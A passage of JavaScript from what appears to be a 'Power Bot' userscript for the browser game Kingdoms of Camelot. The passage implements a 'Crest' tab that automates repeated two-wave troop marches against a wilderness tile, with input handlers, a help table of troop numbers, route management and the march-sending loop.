        CrestOptions.CrestCity = t.tcp.city.id
    }

    $('pbcrest_iswild').addEventListener('click', function(){
        CrestOptions.isWild = this.checked;
    },false);
    $('pbcrest_rnd1').addEventListener('click', function(){
        var checked = (!this.checked);
        CrestOptions.round1 = this.checked;
        $('R1ST').disabled = checked;
        $('R1MM').disabled = checked;
        $('R1Scout').disabled = checked;
        $('R1Pike').disabled = checked;
        $('R1Sword').disabled = checked;
        $('R1Arch').disabled = checked;
        $('R1LC').disabled = checked;
        $('R1HC').disabled = checked;
        $('R1SW').disabled = checked;
        $('R1Ball').disabled = checked;
        $('R1Ram').disabled = checked;
        $('R1Cat').disabled = checked;
    },false);
    $('pbcrest_rnd2').addEventListener('click', function(){
        var checked = (!this.checked);
        CrestOptions.round2 = this.checked;
        $('R2ST').disabled = checked;
        $('R2MM').disabled = checked;
        $('R2Scout').disabled = checked;
        $('R2Pike').disabled = checked;
        $('R2Sword').disabled = checked;
        $('R2Arch').disabled = checked;
        $('R2LC').disabled = checked;
        $('R2HC').disabled = checked;
        $('R2SW').disabled = checked;
        $('R2Ball').disabled = checked;
        $('R2Ram').disabled = checked;
        $('R2Cat').disabled = checked;
    },false);
      document.getElementById('pbcrestx').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbcrestx').value)) document.getElementById('pbcrestx').value='' ;
      }, false);

      document.getElementById('pbcresty').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbcresty').value)) document.getElementById('pbcresty').value='' ;
      }, false);

      document.getElementById('R1ST').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1ST').value)) document.getElementById('R1ST').value=0 ;
      }, false);

      document.getElementById('R1MM').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1MM').value)) document.getElementById('R1MM').value=0 ;
      }, false);

      document.getElementById('R1Pike').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Pike').value)) document.getElementById('R1Pike').value=0 ;
      }, false);

      document.getElementById('R1Scout').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Scout').value)) document.getElementById('R1Scout').value=0 ;
      }, false);

      document.getElementById('R1Sword').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Sword').value)) document.getElementById('R1Sword').value=0 ;
      }, false);

      document.getElementById('R1Arch').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Arch').value)) document.getElementById('R1Arch').value=0 ;
      }, false);

      document.getElementById('R1LC').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1LC').value)) document.getElementById('R1LC').value=0 ;
      }, false);

      document.getElementById('R1HC').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1HC').value)) document.getElementById('R1HC').value=0 ;
      }, false);

      document.getElementById('R1SW').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1SW').value)) document.getElementById('R1SW').value=0 ;
      }, false);

      document.getElementById('R1Ball').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Ball').value)) document.getElementById('R1Ball').value=0 ;
      }, false);

      document.getElementById('R1Ram').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Ram').value)) document.getElementById('R1Ram').value=0 ;
      }, false);

      document.getElementById('R1Cat').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R1Cat').value)) document.getElementById('R1Cat').value=0 ;
      }, false);
      
      document.getElementById('R2ST').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2ST').value)) document.getElementById('R2ST').value=0 ;
      }, false);

      document.getElementById('R2MM').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2MM').value)) document.getElementById('R2MM').value=0 ;
      }, false);

      document.getElementById('R2Pike').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Pike').value)) document.getElementById('R2Pike').value=0 ;
      }, false);

      document.getElementById('R2Scout').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Scout').value)) document.getElementById('R2Scout').value=0 ;
      }, false);

      document.getElementById('R2Sword').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Sword').value)) document.getElementById('R2Sword').value=0 ;
      }, false);

      document.getElementById('R2Arch').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Arch').value)) document.getElementById('R2Arch').value=0 ;
      }, false);

      document.getElementById('R2LC').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2LC').value)) document.getElementById('R2LC').value=0 ;
      }, false);

      document.getElementById('R2HC').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2HC').value)) document.getElementById('R2HC').value=0 ;
      }, false);

      document.getElementById('R2SW').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2SW').value)) document.getElementById('R2SW').value=0 ;
      }, false);

      document.getElementById('R2Ball').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Ball').value)) document.getElementById('R2Ball').value=0 ;
      }, false);

      document.getElementById('R2Ram').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Ram').value)) document.getElementById('R2Ram').value=0 ;
      }, false);

      document.getElementById('R2Cat').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('R2Cat').value)) document.getElementById('R2Cat').value=0 ;
      }, false);
         
         
         
    document.getElementById('pbcrest_iswild').addEventListener('click', function(){CrestOptions.isWild = this.checked;} , false);
    document.getElementById('crestcity').addEventListener('click', function(){CrestOptions.CrestCity = t.tcp.city.id;} , false);
    document.getElementById('Cresttoggle').addEventListener('click', function(){t.toggleCrestState(this)} , false);
    document.getElementById('pbcrestx').addEventListener('change', function(){CrestOptions.X = document.getElementById('pbcrestx').value;;} , false);
    document.getElementById('pbcresty').addEventListener('change', function(){CrestOptions.Y = document.getElementById('pbcresty').value;} , false);
    document.getElementById('R1ST').addEventListener('change', function(){CrestOptions.R1ST = document.getElementById('R1ST').value;} , false);
    document.getElementById('R1MM').addEventListener('change', function(){CrestOptions.R1MM = document.getElementById('R1MM').value;} , false);
    document.getElementById('R1Scout').addEventListener('change', function(){CrestOptions.R1Scout = document.getElementById('R1Scout').value;} , false);
    document.getElementById('R1Pike').addEventListener('change', function(){CrestOptions.R1Pike = document.getElementById('R1Pike').value;} , false);
    document.getElementById('R1Sword').addEventListener('change', function(){CrestOptions.R1Sword = document.getElementById('R1Sword').value;} , false);
    document.getElementById('R1Arch').addEventListener('change', function(){CrestOptions.R1Arch = document.getElementById('R1Arch').value;} , false);
    document.getElementById('R1LC').addEventListener('change', function(){CrestOptions.R1LC = document.getElementById('R1LC').value;} , false);
    document.getElementById('R1HC').addEventListener('change', function(){CrestOptions.R1HC = document.getElementById('R1HC').value;} , false);
    document.getElementById('R1SW').addEventListener('change', function(){CrestOptions.R1SW = document.getElementById('R1SW').value;} , false);
    document.getElementById('R1Ball').addEventListener('change', function(){CrestOptions.R1Ball = document.getElementById('R1Ball').value;} , false);
    document.getElementById('R1Ram').addEventListener('change', function(){CrestOptions.R1Ram = document.getElementById('R1Ram').value;} , false);
    document.getElementById('R1Cat').addEventListener('change', function(){CrestOptions.R1Cat = document.getElementById('R1Cat').value;} , false);
    document.getElementById('R2ST').addEventListener('change', function(){CrestOptions.R2ST = document.getElementById('R2ST').value;} , false);
    document.getElementById('R2MM').addEventListener('change', function(){CrestOptions.R2MM = document.getElementById('R2MM').value;} , false);
    document.getElementById('R2Scout').addEventListener('change', function(){CrestOptions.R2Scout = document.getElementById('R2Scout').value;} , false);
    document.getElementById('R2Pike').addEventListener('change', function(){CrestOptions.R2Pike = document.getElementById('R2Pike').value;} , false);
    document.getElementById('R2Sword').addEventListener('change', function(){CrestOptions.R2Sword = document.getElementById('R2Sword').value;} , false);
    document.getElementById('R2Arch').addEventListener('change', function(){CrestOptions.R2Arch = document.getElementById('R2Arch').value;} , false);
    document.getElementById('R2LC').addEventListener('change', function(){CrestOptions.R2LC = document.getElementById('R2LC').value;} , false);
    document.getElementById('R2HC').addEventListener('change', function(){CrestOptions.R2HC = document.getElementById('R2HC').value;} , false);
    document.getElementById('R2SW').addEventListener('change', function(){CrestOptions.R2SW = document.getElementById('R2SW').value;} , false);
    document.getElementById('R2Ball').addEventListener('change', function(){CrestOptions.R2Ball = document.getElementById('R2Ball').value;} , false);
    document.getElementById('R2Ram').addEventListener('change', function(){CrestOptions.R2Ram = document.getElementById('R2Ram').value;} , false);
    document.getElementById('R2Cat').addEventListener('change', function(){CrestOptions.R2Cat = document.getElementById('R2Cat').value;} , false);
    document.getElementById('CrestHelp').addEventListener('click', function(){t.helpPop();} , false);
    document.getElementById('pbSaveRouteCrest').addEventListener('click', function(){t.addCrestRoute();}, false);
    document.getElementById('showCrestTargets').addEventListener('click', function(){t.showCrestRoute();}, false);
  },
  
  helpPop : function (){
    var helpText = '<BR>The crest tab is designed to attack one wild over and over again.<BR>';
    helpText += 'It will attack a wild in 2 waves, abandon it and start over.<BR>';
    helpText += 'So make sure u have 1 FREE SLOT in your castle for a wild!<BR>';
    helpText += 'Just fill in the coordinates, troops and hit "ON".<BR><BR>';
    helpText += 'Troop numers (from KOC WIKI):<BR>';
    helpText += '<A target="_tab" href="http://koc.wikia.com/wiki/Wilderness">More can be found on Koc Wikia</a>';
    helpText += '<TABLE width=100%><TR><TD>Level</td><TD>Wave 1</td><TD>Wave 2</td><TD>Troop loses</td><TD>Min. Fletching</td></tr>';
    helpText += '<TR><TD>1</td><TD>n/a</td><TD>160 MM</td><TD>12 MM</td><TD>0</td></tr>';
    helpText += '<TR><TD>1</td><TD>n/a</td><TD>80 archers</td><TD>None</td><TD>1+</td></tr>';
    helpText += '<TR><TD>2</td><TD>5 MM</td><TD>130 archers</td><TD>1st Wave</td><TD>2+</td></tr>';
    helpText += '<TR><TD>3</td><TD>10 MM</td><TD>520 archers</td><TD>1st Wave</td><TD>3+</td></tr>';
    helpText += '<TR><TD>4</td><TD>20 MM</td><TD>1600 archers</td><TD>1st Wave</td><TD>4+</td></tr>';
    helpText += '<TR><TD>5</td><TD>50 MM</td><TD>2200 archers</td><TD>1st Wave</td><TD>6+</td></tr>';
    helpText += '<TR><TD>6</td><TD>100 MM</td><TD>3000 archers</td><TD>1st Wave</td><TD>7+</td></tr>';
    helpText += '<TR><TD>7</td><TD>150 MM</td><TD>6000 archers</td><TD>1st Wave</td><TD>8+</td></tr>';
    helpText += '<TR><TD>8</td><TD>299 MM + 1Bal</td><TD>9000 archers + 900 Bal</td><TD>1st Wave + 1 Archer</td><TD>9+</td></tr>';
    helpText += '<TR><TD>9</td><TD>599 MM + 1Bal</td><TD>13000 archers + 900 Bal</td><TD>1st Wave + 2 Archer</td><TD>10</td></tr>';
    helpText += '<TR><TD>10</td><TD>1199 MM + 1Cat</td><TD>35000 archers + 2500 Cat</td><TD>1st Wave + 6 Archer + 50 Cat</td><TD>10</td></tr></table>';
    
    var pop = new pbPopup ('giftHelp', 0, 0, 650, 385, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Power Bot Help: Cresting</b></center>';
    pop.show (true);
  },

/** Add crest route **/
    addCrestRoute : function () {
        if(CrestOptions.X == "" || CrestOptions.Y == "") {
            alert("Please enter Coords");
            return;
        }
        
        var t = Tabs.Crest;
        var CrestLength = CrestData.length;
        
        CrestData[CrestLength] = new CrestFunc(CrestOptions);
        saveCrestData();

    },
    
    

/** Show Crest Targets **/
    showCrestRoute : function () {
        var t = Tabs.Crest;
        var popCrestTargets = null;
        t.popCrestTargets = new pbPopup('pbShowCrestTargets', 0, 0, 1100, 485, true, function() {clearTimeout (1000);});
        var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowCrestTargets" id="pbCrestTargets">';     
        t.popCrestTargets.getMainDiv().innerHTML = '</table></div>' + m;
        t.popCrestTargets.getTopDiv().innerHTML = '<TD><CENTER><B>Crest Targets</center></td>';
        t.paintCrestTargets();
        t._addTabHeader();
        t.popCrestTargets.show(true);

    },
    
    

/** add header **/
    _addTabHeader : function () {
        var row = document.getElementById('pbCrestTargets').insertRow(0);
        row.vAlign = 'top';
             row.insertCell(0).innerHTML = "City / Target";
             row.insertCell(1).innerHTML = "Wave #";
             row.insertCell(2).innerHTML = "SupTroop";
             row.insertCell(3).innerHTML = "MM";
             row.insertCell(4).innerHTML = "Scout";
             row.insertCell(5).innerHTML = "Pike";
             row.insertCell(6).innerHTML = "Sword";
             row.insertCell(7).innerHTML = "Arch";
             row.insertCell(8).innerHTML = "LC";
             row.insertCell(9).innerHTML = "HC";
             row.insertCell(10).innerHTML = "SupWagon";
             row.insertCell(11).innerHTML = "Balls";
             row.insertCell(12).innerHTML = "Ram";
             row.insertCell(13).innerHTML = "Cats";
             row.insertCell(14).innerHTML = "&nbsp;&nbsp;&nbsp;&nbsp;";
    },
    
    

/** paintCrestTargets **/
    paintCrestTargets : function () {
        t = Tabs.Crest;

        for(var i = 0; i < CrestData.length; i++) {
            t._addTabCrest(i, "Attack: " + CrestData[i].X + "," + CrestData[i].Y, "Wave 2", CrestData[i].R2ST, CrestData[i].R2MM, CrestData[i].R2Scout, CrestData[i].R2Pike, CrestData[i].R2Sword, CrestData[i].R2Arch, CrestData[i].R2LC, CrestData[i].R2HC, CrestData[i].R2SW, CrestData[i].R2Ball, CrestData[i].R2Ram, CrestData[i].R2Cat, " ");
            t._addTabCrest(i, CrestData[i].CrestCity, "Wave 1", CrestData[i].R1ST, CrestData[i].R1MM, CrestData[i].R1Scout, CrestData[i].R1Pike, CrestData[i].R1Sword, CrestData[i].R1Arch, CrestData[i].R1LC, CrestData[i].R1HC, CrestData[i].R1SW, CrestData[i].R1Ball, CrestData[i].R1Ram, CrestData[i].R1Cat, "Delete");
            t._addTabCrest(i, "","","","","","","","","","","","","","","");
        }

    },
    
    

/** Add Tab Crest **/
    _addTabCrest : function (QueID, col0, col1, col2, col3, col4, col5, col6, col7, col8, col9, col10, col11, col12, col13, col14) {
        var t = Tabs.Crest;
        var row = document.getElementById('pbCrestTargets').insertRow(0);

        for (var i = 0; i <= 14; i++) {
            if (i == 14 && col14 == "Delete") {
                row.insertCell(i).innerHTML = "<a id=pbCrestDel_" + QueID + " value=" + i + ">Delete</a>";
                document.getElementById('pbCrestDel_' + QueID).addEventListener('click', function(){t.cancelCrestTarget(QueID);}, false);
            } else if (col14 == "Delete" && i == 0) {
                row.insertCell(i).innerHTML = (Cities.byID[col0] ? Cities.byID[col0].name : '');
            } else {
                row.insertCell(i).innerHTML = eval("col" + i) + "&nbsp; &nbsp;";
            }
        }
        
    },
    
    

/** Cancel Crest Target **/
    cancelCrestTarget : function (QueID) {
         var t = Tabs.Crest;
         var queueId = parseInt(QueID);
         CrestData.splice(queueId, 1);
         saveCrestData();
         t.showCrestRoute();
    },
    
    

    getRallypointLevel: function(cityId){
        var t = Tabs.Crest;
        for (var o in Seed.buildings[cityId]){
            var buildingType = parseInt(Seed.buildings[cityId][o][0]);
            var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
            if (buildingType == 12)
                t.rallypointlevel=parseInt(buildingLevel);
        }
    },
  
 

    getAtkKnight : function(cityID){
        var t = Tabs.Crest;
        t.knt = new Array();
        for (k in Seed.knights[cityID]){
            if (Seed.knights[cityID][k]["knightStatus"] == 1 && Seed.leaders[cityID]["resourcefulnessKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["politicsKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["combatKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["intelligenceKnightId"] != Seed.knights[cityID][k]["knightId"]){
                 t.knt.push ({
                     Name:   Seed.knights[cityID][k]["knightName"],
                     Combat:    parseInt(Seed.knights[cityID][k]["combat"]),
                     ID:        Seed.knights[cityID][k]["knightId"],
                 });
             }
        }
        t.knt = t.knt.sort(function sort(a,b) {a = parseInt(a['Combat']);b = parseInt(b['Combat']);return a == b ? 0 : (a > b ? -1 : 1);});
    },
   

   
     sendMarch: function(p,callback,r,retry, CrestDataNum){
        var t = Tabs.Crest;
        March.addMarch(p, function(rslt){
            if(rslt.ok){
                if(r==1){
                    Options.Crest1Count++;
                    r = 2;
                    CrestData[CrestDataNum].curRound = 2;
                var now = new Date().getTime()/1000.0;
                now = now.toFixed(0);
                CrestData[CrestDataNum].lastRoundOne = now;
                } else {
                    Options.Crest2Count++;
                }
                saveCrestData();
                setTimeout (function(){callback(r,0,parseInt(CrestDataNum)+1);}, (Math.random()*10*1000)+(Options.Crestinterval*1000));   
                return;
            } else { //onFailure
                setTimeout (function(){callback(r,0,parseInt(CrestDataNum)+1);}, (Math.random()*10*1000)+(Options.Crestinterval*1000));
            }
        });
    },
    

    
    abandonWilderness: function(tid,x,y,cid,callback,retry, CrestDataNum){
        var t = Tabs.Crest;      
        if (!Options.crestRunning) return;
        
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        var cityID = cid;
        var tileid = tid;
        params.tid=tid;
        params.cid=cid;
        params.x=x;
          params.y=y;                 
          new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/abandonWilderness.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
              parameters: params,
              loading: true,
              onSuccess:function(transport){
                var rslt=eval("("+transport.responseText+")");
                if (rslt.ok) {
                    t.error_code = 0;  
                    if (rslt.returningMarches) {
                        var cities = Object.keys(rslt.returningMarches);
                        for (var i = 0; i < cities.length; i++) {
                            for (var j = 0; j < rslt.returningMarches[cities[i]].length; j++) {
                                var cid = cities[i].split("c")[1];
                                var mid = rslt.returningMarches[cities[i]][j];
                                var march = Seed.queue_atkp["city" + cid]["m" + mid];
                                if (march) {
                                    var marchtime = Math.abs(parseInt(march.destinationUnixTime) - parseInt(march.marchUnixTime));
                                    var ut = unsafeWindow.unixtime();
                                    Seed.queue_atkp["city" + cid]["m" + mid].destinationUnixTime = ut;
                                    Seed.queue_atkp["city" + cid]["m" + mid].marchUnixTime = ut - marchtime;
                                    Seed.queue_atkp["city" + cid]["m" + mid].returnUnixTime = ut + marchtime;
                                    Seed.queue_atkp["city" + cid]["m" + mid].marchStatus = 8
                                }
                            }
                        }
                    }
                    if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
                    if (Object.keys(Seed.wilderness["city" + cityID]).length == 1) {
                        Seed.wilderness["city" + cityID] = []
                       } else    {
                        delete Seed.wilderness["city"+cityID]["t"+tileid];
                       }
                } else {
                    if (rslt.error_code != 401) {
                        t.error_code = rslt.error_code;
                       }
                  }              
              },
              onFailure: function () {}
          });
    },
    
    
    
    Rounds : function (r, retry, CrestDataNum) {
        var t = Tabs.Crest;
        clearTimeout(t.timer);
        //r = (typeof r === 'undefined') ? 0 : r;
        //retry = (typeof retry === 'undefined') ? 0 : retry;
        if (!Options.crestRunning) return;
        if (CrestData.length == 0)
            return;
        if (CrestDataNum >= CrestData.length)
            CrestDataNum = 0;
        r = (typeof CrestData[CrestDataNum].curRound === 'undefined') ? 1 : CrestData[CrestDataNum].curRound;

        cityID = 'city' + CrestData[CrestDataNum].CrestCity;
        retry++;
        if(CrestData[CrestDataNum].isWild){
            for (var k in Seed.wilderness[cityID] ){
                if (Seed.wilderness[cityID][k]['xCoord']==CrestData[CrestDataNum].X && Seed.wilderness[cityID][k]['yCoord']==CrestData[CrestDataNum].Y && t.error_code!=401) {
                    t.abandonWilderness(Seed.wilderness[cityID][k]['tileId'],Seed.wilderness[cityID][k]['xCoord'],Seed.wilderness[cityID][k]['yCoord'],CrestData[CrestDataNum].CrestCity,t.Rounds,retry,CrestDataNum);
                    break;
                }
            }
        }
        /*****
        switch (retry) {
            case 10:
            logit('case 10');
                setTimeout(function(){ t.Rounds(r,retry,CrestDataNum);},Options.Crestinterval*1000);
                return;
                break;
            case 20:
            logit('case 20');
                setTimeout(function(){ t.Rounds(r,retry,CrestDataNum);},Options.Crestinterval*1000);
                return;
                break;
        }
        ****/
        if(r==1)
        if (parseInt(Seed.units[cityID]['unt1']) < CrestData[CrestDataNum].R1ST || parseInt(Seed.units[cityID]['unt2']) < CrestData[CrestDataNum].R1MM || parseInt(Seed.units[cityID]['unt3']) < CrestData[CrestDataNum].R1Scout || parseInt(Seed.units[cityID]['unt4']) < CrestData[CrestDataNum].R1Pike || parseInt(Seed.units[cityID]['unt5']) < CrestData[CrestDataNum].R1Sword || parseInt(Seed.units[cityID]['unt6']) < CrestData[CrestDataNum].R1Arch || parseInt(Seed.units[cityID]['unt7']) < CrestData[CrestDataNum].R1LC || parseInt(Seed.units[cityID]['unt8']) < CrestData[CrestDataNum].R1HC || parseInt(Seed.units[cityID]['unt9']) < CrestData[CrestDataNum].R1SW || parseInt(Seed.units[cityID]['unt10']) < CrestData[CrestDataNum].R1Ball || parseInt(Seed.units[cityID]['unt11']) < CrestData[CrestDataNum].R1Ram || parseInt(Seed.units[cityID]['unt12']) < CrestData[CrestDataNum].R1Cat || parseInt(Seed.units[cityID]['unt1']) < CrestData[CrestDataNum].R2ST || parseInt(Seed.units[cityID]['unt2']) < CrestData[CrestDataNum].R2MM || parseInt(Seed.units[cityID]['unt3']) < CrestData[CrestDataNum].R2Scout || parseInt(Seed.units[cityID]['unt4']) < CrestData[CrestDataNum].R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestData[CrestDataNum].R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestData[CrestDataNum].R2Arch || parseInt(Seed.units[cityID]['unt7']) < CrestData[CrestDataNum].R2LC || parseInt(Seed.units[cityID]['unt8']) < CrestData[CrestDataNum].R2HC || parseInt(Seed.units[cityID]['unt9']) < CrestData[CrestDataNum].R2SW || parseInt(Seed.units[cityID]['unt10']) < CrestData[CrestDataNum].R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestData[CrestDataNum].R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestData[CrestDataNum].R2Cat) {
            if (CrestData.length == 1) {
				logit(inspect(CrestData[0]));
                t.timer = setTimeout(function(){ t.Rounds(r,retry,CrestDataNum);},Options.Crestinterval*1000);
                return;
             } else
                t.timer = setTimeout(function(){ t.Rounds(1,retry,parseInt(CrestDataNum)+1);},Options.Crestinterval*1000);
            return;
        }
        if(r==2)
        if (parseInt(Seed.units[cityID]['unt1']) < CrestData[CrestDataNum].R2ST || parseInt(Seed.units[cityID]['unt2']) < CrestData[CrestDataNum].R2MM || parseInt(Seed.units[cityID]['unt3']) < CrestData[CrestDataNum].R2Scout || parseInt(Seed.units[cityID]['unt4']) < CrestData[CrestDataNum].R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestData[CrestDataNum].R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestData[CrestDataNum].R2Arch || parseInt(Seed.units[cityID]['unt7']) < CrestData[CrestDataNum].R2LC || parseInt(Seed.units[cityID]['unt8']) < CrestData[CrestDataNum].R2HC || parseInt(Seed.units[cityID]['unt9']) < CrestData[CrestDataNum].R2SW || parseInt(Seed.units[cityID]['unt10']) < CrestData[CrestDataNum].R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestData[CrestDataNum].R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestData[CrestDataNum].R2Cat) {
            if (CrestData.length == 1) {
                t.timer = setTimeout(function(){ t.Rounds(r,retry,CrestDataNum);},Options.Crestinterval*1000);
                return;
             } else
                t.timer = setTimeout(function(){ t.Rounds(1,retry,parseInt(CrestDataNum)+1);},Options.Crestinterval*1000);
            return;
        }
        
        t.getAtkKnight(cityID);
        slots=0;
        
        for (z in Seed.queue_atkp[cityID]) {
            slots++;
        }
        if  (Seed.queue_atkp[cityID].toSource() == "[]")
            slots=0;
        var march_slots = March.getEmptySlots(cityID.split("city")[1]);
        if (march_slots < 1) {
           if (CrestData.length == 1) {
            t.timer = setTimeout(function(){ t.Rounds(r,retry,CrestDataNum);},Options.Crestinterval*1000);
         } else {
            t.timer = setTimeout(function(){ t.Rounds(1,retry,parseInt(CrestDataNum)+1);},Options.Crestinterval*1000);
                    }
          return;
    
    }

        if  (t.knt.toSource() == "[]") {
            t.timer = setTimeout(function(){ t.Rounds(1,retry,parseInt(CrestDataNum)+1);},Options.Crestinterval*1000);
            return;
        }
        var kid = t.knt[0].ID;
        if (CrestData[CrestDataNum].R1ST == 0 && CrestData[CrestDataNum].R1MM == 0 && CrestData[CrestDataNum].R1Scout == 0 && CrestData[CrestDataNum].R1Pike == 0 && CrestData[CrestDataNum].R1Sword == 0 && CrestData[CrestDataNum].R1Arch == 0 && CrestData[CrestDataNum].R1LC == 0 && CrestData[CrestDataNum].R1HC == 0 && CrestData[CrestDataNum].R1SW == 0 && CrestData[CrestDataNum].R1Ball == 0 && CrestData[CrestDataNum].R1Ram == 0 && CrestData[CrestDataNum].R1Cat == 0) {
           r=2;
           CrestData[CrestDataNum].curRound = 2;
       }else {
            var now = new Date().getTime()/1000.0;
            now = now.toFixed(0);
            if (now > (parseInt(CrestData[CrestDataNum].lastRoundOne) + 90)) {
			if(CrestData[CrestDataNum].isWild)
			if (now < (parseInt(CrestData[CrestDataNum].lastRoundTwo) + 70)) {
            t.timer = setTimeout(function(){ t.Rounds(1,retry,parseInt(CrestDataNum)+1);},Options.Crestinterval*1000);
				return;
			}
                r=1;
                CrestData[CrestDataNum].curRound =1;
            }
        }
        if(r == 2)CrestData[CrestDataNum].lastRoundTwo = now;
                saveCrestData();
        switch(r) {
            case 1:
                if ((march_slots) < 2) {
                    t.timer = setTimeout(function(){ t.Rounds(1,retry,CrestDataNum+1);},Options.Crestinterval*1000);
                    return;
                }
                var params         =     unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
                params.cid        =     CrestData[CrestDataNum].CrestCity;
                params.type        =    4;
                params.kid        =     kid;
                params.xcoord     =     CrestData[CrestDataNum].X;
                params.ycoord     =     CrestData[CrestDataNum].Y;
                if (now < (parseInt(CrestData[CrestDataNum].lastRoundOne) + 500) && CrestData[CrestDataNum].isWild) {
                
                    params.u2     =     (CrestData[CrestDataNum].R1MM / 10);
                    params.u2     =     params.u2.toFixed(0);
                    
                    if (params.u2 < (CrestData[CrestDataNum].R1MM / 10))
                        params.u2++;
                } else {
                    params.u2    =     CrestData[CrestDataNum].R1MM;
                }
                params.u1         =     CrestData[CrestDataNum].R1ST;
                //params.u2         =     CrestData[CrestDataNum].R1MM;
                params.u3         =     CrestData[CrestDataNum].R1Scout;
                params.u4         =     CrestData[CrestDataNum].R1Pike;
                params.u5         =     CrestData[CrestDataNum].R1Sword;
                params.u6         =     CrestData[CrestDataNum].R1Arch;
                params.u7         =     CrestData[CrestDataNum].R1LC;
                params.u8         =     CrestData[CrestDataNum].R1HC;
                params.u9         =     CrestData[CrestDataNum].R1SW;
                params.u10         =     CrestData[CrestDataNum].R1Ball;
                params.u11         =     CrestData[CrestDataNum].R1Ram;
                params.u12         =     CrestData[CrestDataNum].R1Cat;
                
                t.sendMarch(params,t.Rounds,r,retry, CrestDataNum);
                break;
            default:
                var params         =     unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
                params.cid        =     CrestData[CrestDataNum].CrestCity;
                params.type        =     4;
                params.kid        =     kid;
                params.xcoord     =     CrestData[CrestDataNum].X;
                params.ycoord     =     CrestData[CrestDataNum].Y;
                params.u1         =     CrestData[CrestDataNum].R2ST;
                params.u2         =     CrestData[CrestDataNum].R2MM;
                params.u3         =     CrestData[CrestDataNum].R2Scout;
                params.u4         =     CrestData[CrestDataNum].R2Pike;
                params.u5         =     CrestData[CrestDataNum].R2Sword;
                params.u6         =     CrestData[CrestDataNum].R2Arch;
                params.u7         =     CrestData[CrestDataNum].R2LC;
                params.u8         =     CrestData[CrestDataNum].R2HC;
                params.u9         =     CrestData[CrestDataNum].R2SW;
                params.u10         =     CrestData[CrestDataNum].R2Ball;
                params.u11         =     CrestData[CrestDataNum].R2Ram;
                params.u12         =     CrestData[CrestDataNum].R2Cat;
                t.sendMarch(params,t.Rounds,r,retry, CrestDataNum);
                break;
        }

    },

    toggleCrestState: function(obj) {
        var t = Tabs.Crest;
            if (Options.crestRunning == true) {
                Options.crestRunning = false;
                obj.value = "Crest = OFF";
	   	document.getElementById('CrestToggleTab').innerHTML = '<span style="color: #CCC">Crest: Off</span>'
                saveOptions();
            } else {
                Options.crestRunning = true;
                obj.value = "Crest = ON";
		document.getElementById('CrestToggleTab').innerHTML = '<span style="color: #FFFF00">Crest: On</span>'
                for (crest in Options.Creststatus) {
                    owned = Seed.items['i'+crest];
                    if (owned == undefined) {
                        owned=0;
                    }
                    Options.Creststatus[crest] = owned;
                    Options.Crest1Count = 0;
                    Options.Crest2Count = 0;
                }
                var now = new Date().getTime()/1000.0;
                now = now.toFixed(0);
                Options.LastCrestReport = now;
                saveOptions();
                t.timer = setTimeout(function(){ t.Rounds(1,0,0);}, Options.Crestinterval*1000);
            }
    },
    
    sendCrestReport: function(){
        if(!Options.crestreport || !Options.crestRunning)
            return;
            
        var t = Tabs.Crest;
        var now = new Date().getTime()/1000.0;
        now = now.toFixed(0);
        
        if (now < (parseInt(Options.LastCrestReport)+(Options.CrestMsgInterval*60*60)))
            return;

        var total = 0;
        var wildtype =     '';

        switch (Options.CrestType) {
            case '10':
                wildtype = unsafeWindow.g_js_strings.commonstr.grassland;
                break;
            case '11':
                wildtype = unsafeWindow.g_js_strings.commonstr.lake;
                break;
            case '20':
                wildtype = unsafeWindow.g_js_strings.commonstr.woods;
                break;
            case '30':
                wildtype = unsafeWindow.g_js_strings.commonstr.hills;
                break;
            case '40':
                wildtype = unsafeWindow.g_js_strings.commonstr.mountain;
                break;
            case '50':
                wildtype = unsafeWindow.g_js_strings.commonstr.plain;
                break;
        }
        
        var message = 'Crest Stats: %0A';
